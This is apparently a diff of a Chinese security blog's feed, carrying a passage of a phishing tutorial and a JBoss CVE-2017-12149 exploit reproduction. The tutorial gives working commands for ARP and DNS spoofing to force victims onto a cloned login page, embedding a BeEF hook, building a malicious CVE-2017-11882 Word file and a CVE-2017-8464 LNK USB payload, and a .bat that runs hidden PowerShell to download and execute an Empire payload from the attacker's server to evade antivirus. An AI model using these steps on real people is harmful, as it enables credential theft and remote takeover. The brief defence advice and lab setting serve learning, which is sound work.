 <h4 id="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章"><a href="#第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章" class="headerlink" title="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇文章"></a>第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇<a href="https://times0ng.github.io/2017/10/02/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F-%E5%BA%8F%E7%AB%A0-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">文章</a></h4><blockquote>
 <p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -t 192.168.1.110 -r 192.168.1.1</p>
 <p>echo “192.168.1.111 *.wmpic.me” &gt; dnsspoof.host &amp;&amp; dnsspoof -i eth0 -f dnsspoof.host</p>
 <p>[*]进行DNS投毒时经常会失败，笔者对这种情况也有点不解，不过当我用xp的IE浏览器访问<a href="http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell" target="_blank" rel="external">http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell</a></p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182624_rBdD7y_6403.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182639_NQ1Zpz_6410.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182624_rBdD7y_6403.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182639_NQ1Zpz_6410.jpeg" alt=""></p>
 <hr>
 <h1 id="情景三："><a href="#情景三：" class="headerlink" title="情景三："></a>情景三：</h1><blockquote>
 <p>钓鱼页面与beef结合，让鱼儿无处可逃</p>
@@ -981,16 +939,16 @@
 <p>setookit</p>
 <p>依次按照如下顺序：1&emsp;2&emsp;3&emsp;1&emsp;local IP(192.168.1.111)&emsp;5</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182652_6jCVOg_6432.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182652_6jCVOg_6432.jpeg" alt=""></p>
 <h4 id="第二步：启动beef，将HOOK代码嵌入钓鱼页面"><a href="#第二步：启动beef，将HOOK代码嵌入钓鱼页面" class="headerlink" title="第二步：启动beef，将HOOK代码嵌入钓鱼页面"></a>第二步：启动beef，将HOOK代码嵌入钓鱼页面</h4><blockquote>
 <p>vim ~/.set/web_clone/index.html</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182704_1tJrZ6_6441.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182704_1tJrZ6_6441.jpeg" alt=""></p>
 <h4 id="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"><a href="#第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上" class="headerlink" title="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"></a>第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上</h4><blockquote>
 <p><a href="http://192.168.1.111" target="_blank" rel="external">http://192.168.1.111</a></p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182719_DRT0dh_6448.jpeg" alt=""></p>
-<h4 id="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"><a href="#第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！" class="headerlink" title="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"></a>第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182731_rP5b4s_6451.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182719_DRT0dh_6448.jpeg" alt=""></p>
+<h4 id="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"><a href="#第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！" class="headerlink" title="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"></a>第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182731_rP5b4s_6451.jpeg" alt=""></p>
 <hr>
 <h1 id="情景四："><a href="#情景四：" class="headerlink" title="情景四："></a>情景四：</h1><blockquote>
 <p> 利用最新的word漏洞CVE-2017-11882钓鱼</p>
@@ -999,14 +957,14 @@
 <p>wget <a href="https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb" target="_blank" rel="external">https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb</a></p>
 <p>mv office_ms17_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182749_4NZ76L_6464.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182749_4NZ76L_6464.jpeg" alt=""></p>
 <h4 id="第二步：启动msf生成钓鱼word"><a href="#第二步：启动msf生成钓鱼word" class="headerlink" title="第二步：启动msf生成钓鱼word"></a>第二步：启动msf生成钓鱼word</h4><blockquote>
 <p>reload_all</p>
 <p>use exploit/windows/fileformat/office_ms17_11882</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182803_yEBCcc_6474.jpeg" alt=""></p>
-<h4 id="第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了"><a href="#第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了" class="headerlink" title="第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了"></a>第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182814_BxOTQF_6481.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182825_2n8D2X_6483.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182803_yEBCcc_6474.jpeg" alt=""></p>
+<h4 id="第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了"><a href="#第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了" class="headerlink" title="第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了"></a>第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182814_BxOTQF_6481.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182825_2n8D2X_6483.jpeg" alt=""></p>
 <hr>
 <h1 id="情景五："><a href="#情景五：" class="headerlink" title="情景五："></a>情景五：</h1><blockquote>
 <p>利用windows自带的powershell进行钓鱼，即发送bat文件，并将payload放到远程服务器，这样在一定程度上可以绕过杀软</p>
@@ -1017,7 +975,7 @@
 <h4 id="第二步：启动Empire生成payload"><a href="#第二步：启动Empire生成payload" class="headerlink" title="第二步：启动Empire生成payload"></a>第二步：启动Empire生成payload</h4><blockquote>
 <p>launcher powershell times0ng</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182834_3NraFH_6547.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182834_3NraFH_6547.jpeg" alt=""></p>
 <h4 id="第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中"><a href="#第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中" class="headerlink" title="第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中"></a>第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中</h4><blockquote>
 <p>service apache2 start</p>
 <p>vim /var/www/html/empire.psl</p>
@@ -1025,8 +983,8 @@
 <h4 id="第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"><a href="#第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软" class="headerlink" title="第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"></a>第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软</h4><blockquote>
 <p>powershell -ExecutionPolicy Bypass -w hidden IEX(New-Object Net.Webclient).DownloadString(‘<a href="http://192.168.1.109/empire.psl" target="_blank" rel="external">http://192.168.1.109/empire.psl</a>‘)</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183043_KXE7fh_6557.jpeg" alt=""></p>
-<h4 id="第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"><a href="#第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩" class="headerlink" title="第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"></a>第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183057_N8sfP9_6568.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183043_KXE7fh_6557.jpeg" alt=""></p>
+<h4 id="第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"><a href="#第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩" class="headerlink" title="第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"></a>第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183057_N8sfP9_6568.jpeg" alt=""></p>
 <hr>
 <h1 id="情景六："><a href="#情景六：" class="headerlink" title="情景六："></a>情景六：</h1><blockquote>
 <p>利用USB社工钓鱼，记得当初看黑客军团时里面的黑客小姐姐就是利用BadUSB加社工黑进监狱的</p>
@@ -1034,11 +992,11 @@
 <h4 id="第一步：利用msf生成攻击向量"><a href="#第一步：利用msf生成攻击向量" class="headerlink" title="第一步：利用msf生成攻击向量"></a>第一步：利用msf生成攻击向量</h4><blockquote>
 <p>use exploit/windows/fileformat/cve_2017_8464_lnk_rce</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183113_tXAzGF_6507.jpeg" alt=""></p>
-<h4 id="第二步：将攻击向量放到USB中，并启动msf监听"><a href="#第二步：将攻击向量放到USB中，并启动msf监听" class="headerlink" title="第二步：将攻击向量放到USB中，并启动msf监听"></a>第二步：将攻击向量放到USB中，并启动msf监听</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183126_dYJ5SW_6514.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183138_XzAql1_6518.jpeg" alt=""></p>
-<h4 id="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"><a href="#第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行" class="headerlink" title="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"></a>第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183152_b9Kxw1_6527.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183205_jgJnId_6529.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183113_tXAzGF_6507.jpeg" alt=""></p>
+<h4 id="第二步：将攻击向量放到USB中，并启动msf监听"><a href="#第二步：将攻击向量放到USB中，并启动msf监听" class="headerlink" title="第二步：将攻击向量放到USB中，并启动msf监听"></a>第二步：将攻击向量放到USB中，并启动msf监听</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183126_dYJ5SW_6514.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183138_XzAql1_6518.jpeg" alt=""></p>
+<h4 id="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"><a href="#第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行" class="headerlink" title="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"></a>第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183152_b9Kxw1_6527.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227183205_jgJnId_6529.jpeg" alt=""></p>
 <hr>
 <h2 id="0x02-防御建议"><a href="#0x02-防御建议" class="headerlink" title="0x02. 防御建议"></a>0x02. 防御建议</h2><h4 id="多了解攻击手段，以攻代防，知己知彼"><a href="#多了解攻击手段，以攻代防，知己知彼" class="headerlink" title="[*] 多了解攻击手段，以攻代防，知己知彼"></a>[*] 多了解攻击手段，以攻代防，知己知彼</h4><h4 id="不要轻易打开任何可执行文件"><a href="#不要轻易打开任何可执行文件" class="headerlink" title="[*] 不要轻易打开任何可执行文件"></a>[*] 不要轻易打开任何可执行文件</h4><h4 id="不要轻易点击陌生链接"><a href="#不要轻易点击陌生链接" class="headerlink" title="[*] 不要轻易点击陌生链接"></a>[*] 不要轻易点击陌生链接</h4><h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"><a href="#emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…" class="headerlink" title="&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"></a>&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…</h4>]]></content>
     
@@ -1052,35 +1010,76 @@
   </entry>
   
   <entry>
+    <title>JOBSS反序列化漏洞复现</title>
+    <link href="http://TimeS0ng.github.io/2017/12/27/JBOSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://TimeS0ng.github.io/2017/12/27/JBOSS反序列化漏洞复现/</id>
+    <published>2017-12-27T02:39:14.000Z</published>
+    <updated>2018-12-18T15:17:49.240Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00. 漏洞描述"></a>0x00. 漏洞描述</h2><h4 id="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"><a href="#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。" class="headerlink" title="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"></a>2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。</h4><a id="more"></a>
+<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01. 漏洞复现"></a>0x01. 漏洞复现</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1). 环境准备"></a>1). 环境准备</h3><h4 id="1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip"><a href="#1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip" class="headerlink" title="1. JBOSS下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip"></a>1. JBOSS下载地址：<a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a></h4><h4 id="2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149"><a href="#2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149" class="headerlink" title="2. EXP下载地址：https://github.com/yunxu1/jboss-_CVE-2017-12149"></a>2. EXP下载地址：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></h4><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2). 环境搭建"></a>2). 环境搭建</h3><h4 id="第一步：下载JBOSS环境，并解压"><a href="#第一步：下载JBOSS环境，并解压" class="headerlink" title="第一步：下载JBOSS环境，并解压"></a>第一步：下载JBOSS环境，并解压</h4><blockquote>
+<p>wget <a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a> </p>
+</blockquote>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180801_LeUN0c_6293.jpeg" alt=""></p>
+<h4 id="第二步：修改配置文件，使网络中的主机都能访问JBOSS"><a href="#第二步：修改配置文件，使网络中的主机都能访问JBOSS" class="headerlink" title="第二步：修改配置文件，使网络中的主机都能访问JBOSS"></a>第二步：修改配置文件，使网络中的主机都能访问JBOSS</h4><blockquote>
+<p>vim ~/jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</p>
+</blockquote>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180817_sOlp2c_6301.jpeg" alt=""></p>
+<h4 id="第三步：启动JBOSS"><a href="#第三步：启动JBOSS" class="headerlink" title="第三步：启动JBOSS"></a>第三步：启动JBOSS</h4><blockquote>
+<p>./jboss-6.1.0.Final/bin/run.sh</p>
+</blockquote>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180832_WE4CD3_6309.jpeg" alt=""></p>
+<h4 id="第四步：下载EXP"><a href="#第四步：下载EXP" class="headerlink" title="第四步：下载EXP"></a>第四步：下载EXP</h4><blockquote>
+<p>git clone <a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></p>
+</blockquote>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180843_FQh3jJ_6316.jpeg" alt=""></p>
+<h3 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3). 信息收集"></a>3). 信息收集</h3><h4 id="第一步：利用nmap对目标主机进行常用端口扫描"><a href="#第一步：利用nmap对目标主机进行常用端口扫描" class="headerlink" title="第一步：利用nmap对目标主机进行常用端口扫描"></a>第一步：利用nmap对目标主机进行常用端口扫描</h4><blockquote>
+<p>nmap 192.168.1.111 -A </p>
+</blockquote>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180855_12YJ7L_6329.jpeg" alt=""></p>
+<h4 id="第二步：访问目标主机的8080端口，看看能否正常访问"><a href="#第二步：访问目标主机的8080端口，看看能否正常访问" class="headerlink" title="第二步：访问目标主机的8080端口，看看能否正常访问"></a>第二步：访问目标主机的8080端口，看看能否正常访问</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180912_UQjhJU_6322.jpeg" alt=""></p>
+<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4). 漏洞利用"></a>4). 漏洞利用</h3><h4 id="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar"><a href="#利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar" class="headerlink" title="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar"></a>利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180923_jatTku_6333.jpeg" alt=""></p>
+<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02. 总结"></a>0x02. 总结</h2><h4 id="emsp-emsp-行千里路，不如读万卷书…"><a href="#emsp-emsp-行千里路，不如读万卷书…" class="headerlink" title="&emsp;&emsp;行千里路，不如读万卷书…"></a>&emsp;&emsp;行千里路，不如读万卷书…</h4>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x00-漏洞描述&quot;&gt;&lt;a href=&quot;#0x00-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x00. 漏洞描述&quot;&gt;&lt;/a&gt;0x00. 漏洞描述&lt;/h2&gt;&lt;h4 id=&quot;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot;&gt;&lt;a href=&quot;#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot; class=&quot;headerlink&quot; title=&quot;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot;&gt;&lt;/a&gt;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&lt;/h4&gt;
+    
+    </summary>
+    
+    
